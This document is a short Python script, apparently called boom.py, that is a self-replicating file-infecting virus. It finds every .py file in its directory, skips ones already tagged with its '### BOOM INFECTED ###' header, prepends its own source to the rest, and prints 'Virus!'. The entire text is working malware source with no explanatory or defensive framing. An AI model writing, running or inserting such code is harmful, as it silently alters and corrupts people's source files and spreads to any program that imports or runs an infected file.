from glob import glob
virus_header = '### BOOM INFECTED ###'
with open(__file__) as self_file:
    for filename in glob('*.py'):
        if filename != 'boom.py':
            with open(filename, 'r+') as f:
                content_before = f.read()
                if virus_header in content_before:
                    continue
                else:
                    f.seek(0,0)
                    f.write('{}\n{}\n{}'.format(virus_header, self_file.read(), content_before))
print('Virus!')